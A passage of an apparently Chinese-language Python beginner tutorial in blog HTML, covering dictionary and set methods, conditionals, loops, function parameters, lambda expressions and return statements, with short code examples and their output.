title="字典内置函数&amp;方法"></a>字典内置函数&amp;方法</h3><p>Python字典包含了以下内置函数：</p><table><thead><tr><th>序号</th><th>函数及描述</th><th>实例</th></tr></thead><tbody><tr><td>1</td><td>len(dict) 计算字典元素个数，即键的总数。</td><td><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; len(tinydict) 3</code></td></tr><tr><td>2</td><td>str(dict) 输出字典，可以打印的字符串表示。</td><td><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; str(tinydict) &quot;&#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Class&#39;: &#39;First&#39;, &#39;Age&#39;: 7&#125;&quot;</code></td></tr><tr><td>3</td><td>type(variable) 返回输入的变量类型，如果变量是字典就返回字典类型。</td><td><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; type(tinydict) &lt;class &#39;dict&#39;&gt;</code></td></tr></tbody></table><p>Python字典包含了以下内置方法：</p><table><thead><tr><th>序号</th><th>函数及描述</th></tr></thead><tbody><tr><td>1</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-clear.html">dict.clear()</a> 删除字典内所有元素</td></tr><tr><td>2</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-copy.html">dict.copy()</a> 返回一个字典的浅复制</td></tr><tr><td>3</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html">dict.fromkeys()</a>  创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td></tr><tr><td>4</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-get.html">dict.get(key, default&#x3D;None)</a> 返回指定键的值，如果键不在字典中返回 default 设置的默认值</td></tr><tr><td>5</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-in.html">key in dict</a> 如果键在字典dict里返回true，否则返回false</td></tr><tr><td>6</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-items.html">dict.items()</a> 以列表返回一个视图对象</td></tr><tr><td>7</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-keys.html">dict.keys()</a> 返回一个视图对象</td></tr><tr><td>8</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-setdefault.html">dict.setdefault(key, default&#x3D;None)</a>     和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td>9</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-update.html">dict.update(dict2)</a> 把字典dict2的键&#x2F;值对更新到dict里</td></tr><tr><td>10</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-values.html">dict.values()</a> 返回一个视图对象</td></tr><tr><td>11</td><td>[pop(key<a href="https://www.runoob.com/python3/python3-att-dictionary-pop.html">,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td>12</td><td><a href="https://www.runoob.com/python3/python3-att-dictionary-popitem.html"> popitem()</a> 返回并删除字典中的最后一对键和值。</td></tr></tbody></table><h3 id="字典生成式"><a href="#字典生成式" class="headerlink" title="字典生成式"></a>字典生成式</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">items=<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Fruits&#x27;</span>,<span class="hljs-string">&#x27;Books&#x27;</span>,<span class="hljs-string">&#x27;Others&#x27;</span>]</span>#列表<br>prices=<span class="hljs-selector-attr">[96,78,85]</span><br>d=&#123;item<span class="hljs-selector-class">.upper</span>():price  <span class="hljs-keyword">for</span> item,price <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(items,prices)&#125;#upper是切换成大写的意思<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span><br><br>输出结果：<br><br>&#123;<span class="hljs-string">&#x27;FRUITS&#x27;</span>: <span class="hljs-number">96</span>, <span class="hljs-string">&#x27;BOOKS&#x27;</span>: <span class="hljs-number">78</span>, <span class="hljs-string">&#x27;OTHERS&#x27;</span>: <span class="hljs-number">85</span>&#125;<br></code></pre></td></tr></table></figure><p>当两个列表元素数量不相等时，以元素数量少的那个为基准。</p><h2 id="10-集合"><a href="#10-集合" class="headerlink" title="10.集合"></a>10.集合</h2><p>集合（set）是一个无序的不重复元素序列。</p><p>可以使用大括号 { } 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。</p><p>创建格式：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">parame = &#123;value01,value02,...&#125;<br>或者<br><span class="hljs-function"><span class="hljs-title">set</span><span class="hljs-params">(value)</span></span><br></code></pre></td></tr></table></figure><h3 id="集合的基本操作"><a href="#集合的基本操作" class="headerlink" title="集合的基本操作"></a>集合的基本操作</h3><h4 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">s.<span class="hljs-keyword">add</span>( <span class="hljs-keyword">x</span> )<br></code></pre></td></tr></table></figure><p>将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作。</p><p>还有一个方法，也可以添加元素，且参数可以是列表，元组，字典等，语法格式如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s<span class="hljs-selector-class">.update</span>( <span class="hljs-attribute">x</span> )<br></code></pre></td></tr></table></figure><h4 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">s.<span class="hljs-built_in">remove</span>( x )<br></code></pre></td></tr></table></figure><p>将元素 x 从集合 s 中移除，如果元素不存在，则会发生错误。</p><p>此外还有一个方法也是移除集合中的元素，且如果元素不存在，不会发生错误。格式如下所示：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s<span class="hljs-selector-class">.discard</span>( <span class="hljs-attribute">x</span> )<br></code></pre></td></tr></table></figure><p>我们也可以设置随机删除集合中的一个元素，语法格式如下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">s.<span class="hljs-built_in">pop</span>() <br></code></pre></td></tr></table></figure><h4 id="计算集合元素个数"><a href="#计算集合元素个数" class="headerlink" title="计算集合元素个数"></a>计算集合元素个数</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">len</span><span class="hljs-params">(s)</span></span>#计算集合 s 元素个数。<br></code></pre></td></tr></table></figure><h4 id="清空集合"><a href="#清空集合" class="headerlink" title="清空集合"></a>清空集合</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">s.<span class="hljs-built_in">clear</span>()<br></code></pre></td></tr></table></figure><h4 id="判断元素是否在集合中存在"><a href="#判断元素是否在集合中存在" class="headerlink" title="判断元素是否在集合中存在"></a>判断元素是否在集合中存在</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">x</span> in s<br></code></pre></td></tr></table></figure><h3 id="集合内置方法完整列表"><a href="#集合内置方法完整列表" class="headerlink" title="集合内置方法完整列表"></a>集合内置方法完整列表</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/python3/ref-set-add.html">add()</a></td><td>为集合添加元素</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-clear.html">clear()</a></td><td>移除集合中的所有元素</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-copy.html">copy()</a></td><td>拷贝一个集合</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-difference.html">difference()</a></td><td>返回多个集合的差集</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-difference_update.html">difference_update()</a></td><td>移除集合中的元素，该元素在指定的集合也存在。</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-discard.html">discard()</a></td><td>删除集合中指定的元素</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-intersection.html">intersection()</a></td><td>返回集合的交集</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-intersection_update.html">intersection_update()</a></td><td>返回集合的交集。</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-isdisjoint.html">isdisjoint()</a></td><td>判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-issubset.html">issubset()</a></td><td>判断指定集合是否为该方法参数集合的子集。</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-issuperset.html">issuperset()</a></td><td>判断该方法的参数集合是否为指定集合的子集</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-pop.html">pop()</a></td><td>随机移除元素</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-remove.html">remove()</a></td><td>移除指定元素</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-symmetric_difference.html">symmetric_difference()</a></td><td>返回两个集合中不重复的元素集合。</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-symmetric_difference_update.html">symmetric_difference_update()</a></td><td>移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-union.html">union()</a></td><td>返回两个集合的并集</td></tr><tr><td><a href="https://www.runoob.com/python3/ref-set-update.html">update()</a></td><td>给集合添加元素</td></tr></tbody></table><h2 id="11-条件控制"><a href="#11-条件控制" class="headerlink" title="11.条件控制"></a>11.条件控制</h2><h3 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">if condition_1</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">statement_block_1</span><br><span class="hljs-attribute">elif condition_2</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">statement_block_2</span><br><span class="hljs-attribute">else</span><span class="hljs-punctuation">:</span><br>    statement_block_3<br></code></pre></td></tr></table></figure><h3 id="if-嵌套"><a href="#if-嵌套" class="headerlink" title="if 嵌套"></a>if 嵌套</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">if 表达式1</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">语句</span><br><span class="hljs-attribute">    if 表达式2</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">语句</span><br><span class="hljs-attribute">    elif 表达式3</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">语句</span><br><span class="hljs-attribute">    else</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">语句</span><br><span class="hljs-attribute">elif 表达式4</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">语句</span><br><span class="hljs-attribute">else</span><span class="hljs-punctuation">:</span><br>    语句<br></code></pre></td></tr></table></figure><h2 id="12-循环语句"><a href="#12-循环语句" class="headerlink" title="12.循环语句"></a>12.循环语句</h2><h3 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">while</span> 判断条件(condition)：<br>    执行语句(<span class="hljs-built_in">statements</span>)……<br></code></pre></td></tr></table></figure><h3 id="for-语句"><a href="#for-语句" class="headerlink" title="for 语句"></a>for 语句</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">for <span class="hljs-symbol">&lt;variable&gt;</span> <span class="hljs-keyword">in</span> <span class="hljs-symbol">&lt;sequence&gt;</span>:<br>    <span class="hljs-symbol">&lt;statements&gt;</span><br><span class="hljs-params">else:</span><br>    <span class="hljs-symbol">&lt;statements&gt;</span><br></code></pre></td></tr></table></figure><h3 id="range-函数"><a href="#range-函数" class="headerlink" title="range()函数"></a>range()函数</h3><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl">&gt;&gt;&gt;for i in range(5):<br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(i)</span><br><span class="hljs-meta prompt_">...</span><br>0<br>1<br>2<br>3<br>4<br></code></pre></td></tr></table></figure><h3 id="pass-语句"><a href="#pass-语句" class="headerlink" title="pass 语句"></a>pass 语句</h3><p>Python pass是空语句，是为了保持程序结构的完整性。</p><p>pass 不做任何事情，一般用做占位语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 等待键盘中断 (Ctrl+C)</span><br></code></pre></td></tr></table></figure><h2 id="13-函数"><a href="#13-函数" class="headerlink" title="13.函数"></a>13.函数</h2><p>数是组织好的，可重复使用的，用来实现单一，或相关联功能的代码段。</p><p>函数能提高应用的模块性，和代码的重复利用率。你已经知道Python提供了许多内建函数，比如print()。但你也可以自己创建函数，这被叫做用户自定义函数。</p><h3 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h3><p>你可以定义一个由自己想要功能的函数，以下是简单的规则：</p><ul><li>函数代码块以 <strong>def</strong> 关键词开头，后接函数标识符名称和圆括号 **()**。</li><li>任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。</li><li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。</li><li>函数内容以冒号 : 起始，并且缩进。</li><li><strong>return [表达式]</strong> 结束函数，选择性地返回一个值给调用方，不带表达式的 return 相当于返回 None。</li></ul><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061638336.png" alt="img"></p><p>Python 定义函数使用 def 关键字，一般格式如下：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-function"><span class="hljs-keyword">def</span> 函数名（参数列表）:</span><br><span class="hljs-function">    函数体</span><br></code></pre></td></tr></table></figure><p>默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。</p><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>定义一个函数：给了函数一个名称，指定了函数里包含的参数，和代码块结构。</p><p>这个函数的基本结构完成以后，你可以通过另一个函数调用执行，也可以直接从 Python 命令提示符执行。</p><p>如下实例调用了 <strong>printme()</strong> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-comment"># 定义函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printme</span>(<span class="hljs-params"> <span class="hljs-built_in">str</span> </span>):<br>   <span class="hljs-comment"># 打印任何传入的字符串</span><br>   <span class="hljs-built_in">print</span> (<span class="hljs-built_in">str</span>)<br>   <span class="hljs-keyword">return</span><br> <br><span class="hljs-comment"># 调用函数</span><br>printme(<span class="hljs-string">&quot;我要调用用户自定义函数!&quot;</span>)<br>printme(<span class="hljs-string">&quot;再次调用同一函数&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="可更改-mutable-与不可更改-immutable-对象"><a href="#可更改-mutable-与不可更改-immutable-对象" class="headerlink" title="可更改(mutable)与不可更改(immutable)对象"></a>可更改(mutable)与不可更改(immutable)对象</h4><p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p><ul><li><strong>不可变类型：</strong>变量赋值 <strong>a&#x3D;5</strong> 后再赋值 <strong>a&#x3D;10</strong>，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变 a 的值，相当于新生成了 a。</li><li><strong>可变类型：</strong>变量赋值 <strong>la&#x3D;[1,2,3,4]</strong> 后再赋值 <strong>la[2]&#x3D;5</strong> 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。</li></ul><p>python 函数的参数传递：</p><ul><li><strong>不可变类型：</strong>类似 C++ 的值传递，如整数、字符串、元组。如 fun(a)，传递的只是 a 的值，没有影响 a 对象本身。如果在 fun(a) 内部修改 a 的值，则是新生成一个 a 的对象。</li><li><strong>可变类型：</strong>类似 C++ 的引用传递，如 列表，字典。如 fun(la)，则是将 la 真正的传过去，修改后 fun 外部的 la 也会受影响</li></ul><p>python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>以下是调用函数时可使用的正式参数类型：</p><ul><li>必需参数</li><li>关键字参数</li><li>默认参数</li><li>不定长参数</li></ul><h4 id="必需参数"><a href="#必需参数" class="headerlink" title="必需参数"></a>必需参数</h4><p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p><p>调用 printme() 函数，你必须传入一个参数，不然会出现语法错误</p><h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h4><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p><p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p><h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><p>调用函数时，如果没有传递参数，则会使用默认参数。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-comment">#可写函数说明</span><br>def printinfo( name, age = 35 ):<br>   <span class="hljs-string">&quot;打印任何传入的字符串&quot;</span><br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;名字: &quot;</span>, name)<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;年龄: &quot;</span>, age)<br>   return<br> <br><span class="hljs-comment">#调用printinfo函数</span><br>printinfo( <span class="hljs-attribute">age</span>=50, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;runoob&quot;</span> )<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;------------------------&quot;</span>)<br>printinfo( <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;runoob&quot;</span> )<br><br>输出结果：<br><br>名字:  runoob<br>年龄:  50<br>------------------------<br>名字:  runoob<br>年龄:  35<br></code></pre></td></tr></table></figure><h4 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h4><p>你可能需要一个函数能处理比当初声明时更多的参数。这些参数叫做不定长参数，和上述 2 种参数不同，声明时不会命名。基本语法如下：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">def functionname([<span class="hljs-keyword">formal</span><span class="hljs-number">_</span>args,] *var<span class="hljs-number">_</span>args<span class="hljs-number">_</span>tuple ):<br>   <span class="hljs-string">&quot;函数_文档字符串&quot;</span><br>   <span class="hljs-keyword">function</span><span class="hljs-number">_</span>suite<br>   <span class="hljs-keyword">return</span> [expression]<br></code></pre></td></tr></table></figure><p>加了星号 * 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-comment"># 可写函数说明</span><br>def printinfo( arg1, *vartuple ):<br>   <span class="hljs-string">&quot;打印任何传入的参数&quot;</span><br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;输出: &quot;</span>)<br>   <span class="hljs-built_in">print</span> (arg1)<br>   <span class="hljs-built_in">print</span> (vartuple)<br> <br><span class="hljs-comment"># 调用printinfo 函数</span><br>printinfo( 70, 60, 50 )<br><br>输出: <br>70<br>(60, 50)<br></code></pre></td></tr></table></figure><p>还有一种就是参数带两个星号 **基本语法如下：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">def functionname([<span class="hljs-keyword">formal</span><span class="hljs-number">_</span>args,] **var<span class="hljs-number">_</span>args<span class="hljs-number">_</span>dict ):<br>   <span class="hljs-string">&quot;函数_文档字符串&quot;</span><br>   <span class="hljs-keyword">function</span><span class="hljs-number">_</span>suite<br>   <span class="hljs-keyword">return</span> [expression]<br></code></pre></td></tr></table></figure><p>加了两个星号 ** 的参数会以字典的形式导入。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-comment"># 可写函数说明</span><br>def printinfo( arg1, **vardict ):<br>   <span class="hljs-string">&quot;打印任何传入的参数&quot;</span><br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;输出: &quot;</span>)<br>   <span class="hljs-built_in">print</span> (arg1)<br>   <span class="hljs-built_in">print</span> (vardict)<br> <br><span class="hljs-comment"># 调用printinfo 函数</span><br>printinfo(1, <span class="hljs-attribute">a</span>=2,b=3)<br><br>输出结果：<br>输出: <br>1<br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: 2, <span class="hljs-string">&#x27;b&#x27;</span>: 3&#125;<br></code></pre></td></tr></table></figure><p>声明函数时，参数中星号 * 可以单独出现，例如:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">a,b,*,c</span>):<br>    <span class="hljs-keyword">return</span> a+b+c<br></code></pre></td></tr></table></figure><p>如果单独出现星号 * 后的参数必须用关键字传入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 匿名函数">&gt;&gt;&gt; def f(a,b,*,c):<br>...     return a+b+c<br>... <br>&gt;&gt;&gt; f(1,2,3)   # 报错<br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>TypeError: f() takes 2 positional arguments but 3 were given<br>&gt;&gt;&gt; f(1,2,c=3) # 正常<br>6<br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>Python 使用 lambda 来创建匿名函数。</p><p>所谓匿名，意即不再使用 <strong>def</strong> 语句这样标准的形式定义一个函数。</p><ul><li>lambda 只是一个表达式，函数体比 <strong>def</strong> 简单很多。</li><li>lambda 的主体是一个表达式，而不是一个代码块。仅仅能在 lambda 表达式中封装有限的逻辑进去。</li><li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数。</li><li>虽然 lambda 函数看起来只能写一行，却不等同于 C 或 C++ 的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</li></ul><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>lambda 函数的语法只包含一个语句，如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-built_in">lambda</span> [arg1 [,arg2,.....argn]]<span class="hljs-symbol">:expression</span><br></code></pre></td></tr></table></figure><p>设置参数 a 加上 10:</p><p>x &#x3D; lambda a : a + 10 print(x(5))</p><p>以上实例输出结果：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">15<br></code></pre></td></tr></table></figure><p>以下实例匿名函数设置两个参数：</p><p>#!&#x2F;usr&#x2F;bin&#x2F;python3  # 可写函数说明 sum &#x3D; lambda arg1, arg2: arg1 + arg2  # 调用sum函数 print (“相加后的值为 : “, sum( 10, 20 )) print (“相加后的值为 : “, sum( 20, 20 ))</p><p>以上实例输出结果：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">相加后的值为 :  30<br>相加后的值为 :  40<br></code></pre></td></tr></table></figure><p>我们可以将匿名函数封装在一个函数内，这样可以使用同样的代码来创建多个匿名函数。</p><p>以下实例将匿名函数封装在 myfunc 函数中，通过传入不同的参数来创建不同的匿名函数：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">myfunc</span>(<span class="hljs-variable">n</span>):</span><br><span class="hljs-function">  <span class="hljs-variable">return</span> <span class="hljs-variable">lambda</span> <span class="hljs-variable">a</span> : <span class="hljs-variable">a</span> * <span class="hljs-variable">n</span></span><br><span class="hljs-function"> </span><br><span class="hljs-function"><span class="hljs-variable">mydoubler</span> = <span class="hljs-title">myfunc</span>(<span class="hljs-number">2</span>)</span><br><span class="hljs-variable">mytripler</span> = <span class="hljs-function"><span class="hljs-title">myfunc</span>(<span class="hljs-number">3</span>)</span><br> <br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title">mydoubler</span>(<span class="hljs-number">11</span>))</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title">mytripler</span>(<span class="hljs-number">11</span>))</span><br><br>输出结果：<br><span class="hljs-number">22</span><br><span class="hljs-number">33</span><br></code></pre></td></tr></table></figure><h3 id="return语句"><a href="#return语句" class="headerlink" title="return语句"></a>return语句</h3><p><strong>return [表达式]</strong> 语句用于退出函数，选择性地向调用方返回一个表达式。不带参数值的return语句返回None。之前的例子都没有示范如何返回数值，以下实例演示了 return 语句的用法：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span 